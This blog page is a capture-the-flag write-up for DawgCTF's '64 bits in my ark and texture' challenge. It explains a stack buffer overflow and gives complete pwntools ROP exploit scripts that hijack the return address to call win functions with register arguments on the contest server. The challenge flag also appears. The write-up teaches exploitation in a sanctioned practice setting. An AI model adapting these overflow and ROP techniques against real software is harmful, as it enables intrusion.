<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="Pablo">
<meta name="description" content="Challenge: 64 bits in my Ark and Texture (300 points) Can you pwn it? No libc or system needed. Just good ol, 64 bit binary exploitation. nc connect.umbccd.net 22237
Alongside this, we are provided with a binary file. When we execute the file 3 basic questions about x86-64 appear. Once we answer the first three questions (2, 1, 4), the first part of the challenge is proposed:
They ask us to simply jump to a memory address, if we run this binary with ghidra or binaryNinja wen can see the first vulnerability." />
<meta name="keywords" content=", buffer overflow, exploitation, gdb" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://pablo10diez2.github.io/webPablo/posts/dawgctf/64-bits/" />


    <title>
        
            [PWN] 64 bits in my ark and texture :: Welcome!  — Writeups CTF
        
    </title>





  <link rel="stylesheet" href="/webPablo/main.min.ab5336003ba331300318b49292c672210905baf1ef5410a739f647e70c8808fa.css" integrity="sha256-q1M2ADujMTADGLSSksZyIQkFuvHvVBCnOfZH5wyICPo=" crossorigin="anonymous">





    <link rel="apple-touch-icon" sizes="180x180" href="/webPablo/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/webPablo/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/webPablo/favicon-16x16.png">
    <link rel="manifest" href="/webPablo/site.webmanifest">
    <link rel="mask-icon" href="/webPablo/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="/webPablo/favicon.ico">
    <meta name="msapplication-TileColor" content="">


<meta itemprop="name" content="[PWN] 64 bits in my ark and texture">
<meta itemprop="description" content="Challenge: 64 bits in my Ark and Texture (300 points) Can you pwn it? No libc or system needed. Just good ol, 64 bit binary exploitation. nc connect.umbccd.net 22237
Alongside this, we are provided with a binary file. When we execute the file 3 basic questions about x86-64 appear. Once we answer the first three questions (2, 1, 4), the first part of the challenge is proposed:
They ask us to simply jump to a memory address, if we run this binary with ghidra or binaryNinja wen can see the first vulnerability."><meta itemprop="datePublished" content="2025-04-21T00:00:00+00:00" />
<meta itemprop="dateModified" content="2025-04-21T00:00:00+00:00" />
<meta itemprop="wordCount" content="1515">
<meta itemprop="keywords" content="buffer overflow,exploitation,gdb," />
<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="[PWN] 64 bits in my ark and texture"/>
<meta name="twitter:description" content="Challenge: 64 bits in my Ark and Texture (300 points) Can you pwn it? No libc or system needed. Just good ol, 64 bit binary exploitation. nc connect.umbccd.net 22237
Alongside this, we are provided with a binary file. When we execute the file 3 basic questions about x86-64 appear. Once we answer the first three questions (2, 1, 4), the first part of the challenge is proposed:
They ask us to simply jump to a memory address, if we run this binary with ghidra or binaryNinja wen can see the first vulnerability."/>





    <meta property="article:section" content="reversing" />



    <meta property="article:published_time" content="2025-04-21 00:00:00 &#43;0000 UTC" />












    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/webPablo" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text ">
                hello</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
                <nav class="menu">
    <ul class="menu__inner"><li><a href="/webPablo/posts/">Writeups</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
        </span>
    </span>
</header>


            <div class="content">
                
  <main class="post">

    <div class="post-info">
      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
          <circle cx="12" cy="12" r="10"></circle>
          <polyline points="12 6 12 12 16 14"></polyline>
        </svg>
        8 minutes

        
      </p>
    </div>

    <article>
      <h1 class="post-title">
        <a href="https://pablo10diez2.github.io/webPablo/posts/dawgctf/64-bits/">[PWN] 64 bits in my ark and texture</a>
      </h1>

      

      

      

      <div class="post-content">
        <p>Challenge:
<strong>64 bits in my Ark and Texture (300 points)
Can you pwn it? No libc or system needed. Just good ol, 64 bit binary exploitation.
nc connect.umbccd.net 22237</strong></p>
<p>Alongside this, we are provided with a binary file. When we execute the
file 3 basic questions about x86-64 appear.
Once we answer the first three questions (2, 1, 4), the first part of the
challenge is proposed:</p>
<p><img src="/webPablo/images/questions.png" alt="Questions"></p>
<p>They ask us to simply jump to a memory address, if we run this binary with
ghidra or binaryNinja wen can see the first vulnerability.</p>
<p><img src="/webPablo/images/binary.png" alt="Binary"></p>
<p>The main function is using fgets() to read the user input. The problem is that is reading
(0x200 -&gt; 512) 512 bytes and stores it in a variable buf. But since buf is defined as
int64_t it means it can only store 8 bytes. Also the name of the rest of the functions
are win1, win2, win3 and the main function so we need to take that into account if we
dont want to use the pure addresses.</p>
<p>This leads us to a buffer overflow vulnerability, since we can input more bytes than
the variable is able to deal with we can overwrite memory addresses.
For us to make a call to another function we need to understand some basic things.</p>
<p>Once a function finishes it knows where to jump thanks to the return pointer that stores
the address of the next function. So the first thing we need to know is how much data we
need to input before overwriting this pointer. For this I&rsquo;m goint to be using gdb with pwn.</p>
<p>First we run in our terminal gdb ./chall, when we are alredy inside of pwndgb we can enter the
command run and answer the questions. Once we answer them we have to make a little script with
python that will allow as to know the number of character we need to introduce.</p>
<p>These 3 lines of code allow us to create a pattern, lets say for example 200. Once we have that
we print it and copy it to out clipboard.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>pattern <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">200</span>)
</span></span><span style="display:flex;"><span>print(pattern<span style="color:#f92672">.</span>decode())
</span></span></code></pre></div><p>Now we enter this pattern and see that the program failed, we accessed something that we shouldn&rsquo;t in the memory and it
broke. But if we scroll down a little bit we can see some interesting report that pwndgb shows to us.</p>
<p><img src="/webPablo/images/first.png" alt="Error"></p>
<p>We can see the value of rsp (the return pointer address) with some letters that seem familiar, part of the pattern
we introduced. With another line of code we can see how many chars we need to reach the rsp.</p>
<p><img src="/webPablo/images/error.png" alt="rsp"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>print(cyclic_find(<span style="color:#e6db74">&#34;naaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>))
</span></span></code></pre></div><p>And this prints 152, meaning that after 152 characters we can point to wherever we want and the program will
jump there.</p>
<p>We are going to use another python file to complete this task.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Load the binary as an ELF object. We set checksec to False</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># to skip security checks if we already know the result</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># (you can check manually with: checksec --file=./chall)</span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./chall&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># It&#39;s good practice to define the context so pwntools knows</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># we are working with a 64-bit x86 binary</span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> elf
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Open the remote connection</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;connect.umbccd.net&#34;</span>, <span style="color:#ae81ff">22237</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send the correct answers to the initial quiz questions</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;2&#34;</span>)
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;1&#34;</span>)
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;4&#34;</span>)
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ------- PAYLOAD 1 ----------</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create a ROP (Return Oriented Programming) object to</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># build the payload.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># The payload is constructed locally using the ELF binary</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># and then sent to the remote process.</span>
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> ROP(elf)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Fill the buffer with 152 characters, stopping right</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># before the return address</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">152</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Insert a &#39;ret&#39; gadget to align the stack (this ensures</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># the stack is 16-byte aligned before a function call).</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># This is sometimes required on x86-64 systems to avoid</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># crashes or undefined behavior.</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(p64(rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;ret&#39;</span>])<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>call(<span style="color:#e6db74">&#39;win1&#39;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(rop<span style="color:#f92672">.</span>chain())
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span></code></pre></div><p>With this we can achieve what we wanted but is not enough now they ask us to do the following.</p>
<p><strong>You have passed the first challenge. The next one won&rsquo;t be so simple.
Lesson 2 Arguments: Research how arguments are passed to functions and apply your learning. Bring the artifact of 0xDEADBEEF to
the temple of 0x401314 to claim your advance.DawgCTF{C0ngR4tul4t10ns_
Continue:</strong></p>
<p>We need to call another function but in this case with an argument. Now we need to understand how to call a function in this case.
Here comes to play the title of the challenge (64-bits). Let&rsquo;s look at the image below, above the return pointer there are arguments from 7 to
n and below the pointer the registers. When a function is called in 32 bit architecture all the arguments are passed directly to the stack.
But in this case we are working in a 64 bits architecture and when calling a function the first 6 parameters are stored in different registers.
That&rsquo;s why in the image the arguments start from the 7th.</p>
<p><img src="/webPablo/images/stack.png" alt="stack"></p>
<p>Now that we know this we can take a look at which are the registers that are used for the arguments. Since we are only going to need
1 argument we will use rdi.</p>
<p><img src="/webPablo/images/registers.png" alt="registers"></p>
<p>Before rewriting the script, once the first bufferoverflow is done calling win1 we can then concatenate the next payload. There
is no need to make another bufferoverflow since we are alredy stacking them in the stack.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Load the binary as an ELF object. We set checksec to False to skip security checks</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># if we already know the result (you can check manually with: checksec --file=./chall)</span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./chall&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># It&#39;s good practice to define the context so pwntools knows we are working with a 64-bit x86 binary</span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> elf
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Open the remote connection</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;connect.umbccd.net&#34;</span>, <span style="color:#ae81ff">22237</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send the correct answers to the initial quiz questions</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;2&#34;</span>)
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;1&#34;</span>)
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;4&#34;</span>)
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ------- PAYLOAD 1 ----------</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create a ROP (Return Oriented Programming) object to build the payload.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># The payload is constructed locally using the ELF binary and then sent to the remote process.</span>
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> ROP(elf)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Fill the buffer with 152 characters, stopping right before the return address</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">152</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Insert a &#39;ret&#39; gadget to align the stack (this ensures the stack is 16-byte aligned before a function call)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># This is sometimes required on x86-64 systems to avoid crashes or undefined behavior.</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(p64(rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;ret&#39;</span>])<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>call(<span style="color:#e6db74">&#39;win1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ------- PAYLOAD 2 ----------</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Similar approach, but now we add the first function argument in the rdi register</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(p64(rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;ret&#39;</span>])<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>call(<span style="color:#e6db74">&#34;win2&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(rop<span style="color:#f92672">.</span>chain())
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;A&#34;</span>)
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span></code></pre></div><p>Now we are presented with the last challenge.
<strong>You have done well, however you still have one final test. You must now bring 3 artifacts of [0xDEADBEEF] [0xDEAFFACE] and
[0xFEEDCAFE]. You must venture out and find the temple yourself. I believe in you
d15c1p13_y0u_
Final Test:</strong></p>
<p>This is no different than the previous one, we just need to concatenate the 3 payloads and this is the final script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Load the binary as an ELF object. We set checksec</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># to False to skip security checks if we already know</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># the result (you can check manually with: checksec --file=./chall)</span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./chall&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># It&#39;s good practice to define the context so pwntools</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># knows we are working with a 64-bit x86 binary</span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> elf
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Open the remote connection</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;connect.umbccd.net&#34;</span>, <span style="color:#ae81ff">22237</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send the correct answers to the initial quiz questions</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;2&#34;</span>)
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;1&#34;</span>)
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;4&#34;</span>)
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#All three payloads will be executed in a row. This means</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># we don’t need to perform three separate buffer overflows.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># After the first overflow, we can place all return addresses</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># on the stack, and they will be executed sequentially.That&#39;s</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># why we build everything together and send it in a single rop.chain() call.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ------- PAYLOAD 1 ----------</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create a ROP (Return Oriented Programming) object to build</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># the payload. The payload is constructed locally using the</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ELF binary and then sent to the remote process.</span>
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> ROP(elf)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Fill the buffer with 152 characters, stopping right</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># before the return address.</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">152</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Insert a &#39;ret&#39; gadget to align the stack (this ensures</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># the stack is 16-byte aligned before a function call).</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># This is sometimes required on x86-64 systems to avoid</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># crashes or undefined behavior.</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(p64(rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;ret&#39;</span>])<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>call(<span style="color:#e6db74">&#39;win1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ------- PAYLOAD 2 ----------</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Similar approach, but now we add the first function</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># argument in the rdi register</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(p64(rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;ret&#39;</span>])<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>call(<span style="color:#e6db74">&#34;win2&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ------- PAYLOAD 3 ----------</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Now we add values for rdi, rsi, and rdx registers</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># for a function that expects three arguments</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeafface</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xfeedcafe</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(p64(rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;ret&#39;</span>])<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>call(<span style="color:#e6db74">&#34;win3&#34;</span>)
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>call(<span style="color:#e6db74">&#34;exit&#34;</span>)  <span style="color:#75715e"># Graceful exit after payload</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send the full payload chain</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(rop<span style="color:#f92672">.</span>chain())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Handle any final prompts and interaction</span>
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Continue:&#34;</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;A&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Test:&#34;</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;A&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span></code></pre></div><p><strong>Congratulations. You are deserving of you reward
4r3_r34dy_2_pwn!}</strong></p>

      </div>
    </article>

    <hr />

    <div class="post-info">
      
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>

        <span class="tag"><a href="https://pablo10diez2.github.io/webPablo/tags/buffer-overflow/">buffer overflow</a></span>
        <span class="tag"><a href="https://pablo10diez2.github.io/webPablo/tags/exploitation/">exploitation</a></span>
        <span class="tag"><a href="https://pablo10diez2.github.io/webPablo/tags/gdb/">gdb</a></span>
        
    </p>

      
    <p>
